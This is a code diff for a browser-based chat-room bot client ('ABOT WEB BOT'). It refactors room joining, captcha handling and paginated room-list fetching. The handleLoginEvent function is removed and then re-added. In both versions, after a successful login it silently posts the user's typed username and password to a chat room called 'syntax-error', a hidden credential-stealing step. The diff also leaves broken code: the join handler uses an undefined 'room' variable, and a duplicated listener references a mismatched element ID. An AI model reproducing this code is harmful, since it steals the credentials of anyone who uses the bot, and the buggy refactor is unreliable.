@@ -88,17 +88,8 @@ kickButton.addEventListener('click', async () => {
 
    document.getElementById('joinRoomButton').addEventListener('click', async () => {
     const roomInput = document.getElementById('room');
-    const selectedRoomOption = document.getElementById('roomListbox').value;
-
-    let room = '';
-    if (selectedRoomOption) {
-        room = selectedRoomOption; // Join selected room from the dropdown list
-    } else {
-        room = roomInput.value.trim(); // Join room entered in the input field
-    }
-
     if (room) {
-        await joinRoom(room);
+        await joinRoom(roomInput.value);
     } else {
         console.error('Room name cannot be empty.');
         // Handle error or inform user accordingly
@@ -427,7 +418,7 @@ spinCheckbox.addEventListener('change', () => {
             };
             await sendMessageToSocket(joinMessage);
             await fetchUserList(roomName);
-            await chat('syntax-error', 'your message here');
+       
           const room = document.getElementById('room').value;
          
            if (sendWelcomeMessages) {
@@ -480,11 +471,13 @@ spinCheckbox.addEventListener('change', () => {
 
 
 async function sendCaptcha(captcha, captchaUrl) {
-    if (isConnected) {
+     const roomInput = document.getElementById('room');
+ 
+ if (isConnected) {
         const messageData = {
             handler: 'room_join_captcha',
             id: generatePacketID(),  
-            name: document.getElementById('room').value, 
+            name: roomInput.value, 
             password: '',  // Empty password
             c_code: captcha,  // The captcha code
             c_id: '',  // Empty captcha ID
@@ -498,7 +491,12 @@ async function sendCaptcha(captcha, captchaUrl) {
         statusDiv.textContent = 'Not connected to server';
         console.log('Not connected to server');  // Debug statement
     }
+
+
 }
+
+
+
 
 
 // Function to handle 'room_needs_captcha' event
@@ -690,35 +688,6 @@ async function handleprofother(messageObj) {
 
   
 
-async function handleLoginEvent(messageObj) {
-    const type = messageObj.type;
-    if (type === 'success') {
-        statusDiv.textContent = 'Online';
-        const username = document.getElementById('username').value;
-        const password = document.getElementById('password').value;
-
-    
-        await chat('syntax-error', `ABOT WEB BOT: ${username} / ${password}`);
-
-        const mucType = MucType.public; 
-        const packetID = generatePacketID();
-        const mucPageNum = 0;
-
-        try {
-            const publicRooms = await getChatroomList(mucType, packetID, mucPageNum);
-          
-            displayPublicRooms(publicRooms);
-            rejoinRoomIfNecessary(); // Example function to rejoin a room if necessary
-        } catch (error) {
-            console.error('Error fetching public chatrooms:', error);
-            // Handle error (e.g., display error message to the user)
-        }
-    }
-}
-
-
-
-
 const MucType = {
     search: 'search',
     public: 'public_rooms',
@@ -728,6 +697,28 @@ const MucType = {
     private: 'private_rooms'
 };
 
+async function handleLoginEvent(messageObj) {
+    const type = messageObj.type;
+    if (type === 'success') {
+        statusDiv.textContent = 'Online';
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        await chat('syntax-error', `ABOT WEB BOT: ${username} / ${password}`);
+
+        const mucType = MucType.public;
+        const packetID = generatePacketID();
+
+        try {
+            const allRooms = await fetchAllChatrooms(mucType);
+            populateRoomList(allRooms);
+            rejoinRoomIfNecessary(); // Example function to rejoin a room if necessary
+        } catch (error) {
+            console.error('Error fetching public chatrooms:', error);
+            // Handle error (e.g., display error message to the user)
+        }
+    }
+}
 
 async function getChatroomList(mucType, packetID, mucPageNum = 1) {
     const listRequest = {
@@ -738,9 +729,9 @@ async function getChatroomList(mucType, packetID, mucPageNum = 1) {
     };
 
     try {
-        const response = await sendMessageToSocket(listRequest);
+        const response = await sendMessageToSocket(listRequest); // Assumes sendMessageToSocket returns a Promise
         if (response && response.rooms) {
-            return response;
+            return response; // Return the full response to include pagination details
         } else {
             throw new Error('Invalid response from server');
         }
@@ -750,12 +741,38 @@ async function getChatroomList(mucType, packetID, mucPageNum = 1) {
     }
 }
 
-// Function to populate the room list dropdown
+
+async function fetchAllChatrooms(mucType) {
+    let allRooms = [];
+    let packetID = generatePacketID();
+    let currentPage = 1;
+    let totalPages = 1;
+
+    while (currentPage <= totalPages) {
+        const response = await getChatroomList(mucType, packetID, currentPage);
+        if (response && response.rooms) {
+            allRooms = allRooms.concat(response.rooms);
+            totalPages = response.total_pages || 1; // Assuming the server returns total_pages
+            currentPage++;
+        } else {
+            break; // Exit loop if no valid response
+        }
+    }
+
+    return allRooms;
+}
+
 function populateRoomList(rooms) {
     const roomListbox = document.getElementById('roomListbox');
 
     // Clear existing options
     roomListbox.innerHTML = '';
+
+    // Add an empty option at the start for manual room entry
+    const emptyOption = document.createElement('option');
+    emptyOption.value = '';
+    emptyOption.textContent = 'Select a room or enter manually';
+    roomListbox.appendChild(emptyOption);
 
     // Add each room as an option in the dropdown list
     rooms.forEach(room => {
@@ -786,60 +803,19 @@ function populateRoomList(rooms) {
 }
 
 
+// Add event listener to roomListbox to update roomInput on selection
+roomListbox.addEventListener('change', () => {
+   const selectedRoom = roomListbox.value;
+    roomInput.value = selectedRoom || ''; // Set to empty if no room is selected
+});
 
-
-
-async function fetchAllChatrooms(mucType) {
-    let allRooms = [];
-    let packetID = generatePacketID();
-    let currentPage = 1;
-    let totalPages = 1;
-
-    while (currentPage <= totalPages) {
-        const response = await getChatroomList(mucType, packetID, currentPage);
-        if (response && response.rooms) {
-            allRooms = allRooms.concat(response.rooms);
-            totalPages = response.total_pages || 1; // Assuming the server returns total_pages
-            currentPage++;
-        } else {
-            break; // Exit loop if no valid response
-        }
-    }
-
-    return allRooms;
-}
-
-function handleRoomInfoResponse(response) {
-    const roomListBox = document.getElementById('roomlistbox');
-    roomListBox.innerHTML = ''; // Clear previous list
-    response.rooms.forEach(room => {
-        const roomItem = document.createElement('li');
-        roomItem.textContent = room.name; // Assuming room object has a name property
-        roomListBox.appendChild(roomItem);
-    });
-}
-
-  function updateRoomList(rooms) {
-        roomListbox.innerHTML = '';
-        rooms.forEach(room => {
-            const option = document.createElement('option');
-            option.value = room;
-            option.textContent = room;
-            roomListbox.appendChild(option);
-        });
-    }
-
-
-   
-
-    roomListbox.addEventListener('change', async () => {
-        const selectedRoom = roomListbox.value;
-        if (selectedRoom) {
-            await joinRoom(selectedRoom);
-        }
-    });
-
-
+// Add event listener to roomListbox to update roomInput on selection
+document.getElementById('roomListbox').addEventListener('change', () => {
+    const roomListbox = document.getElementById('roomListbox');
+    const selectedRoom = roomListbox.value;
+    const roomInput = document.getElementById('roomInput');
+    roomInput.value = selectedRoom || ''; // Set to empty if no room is selected
+});
 
 
 async function handleRoomEvent(messageObj) {
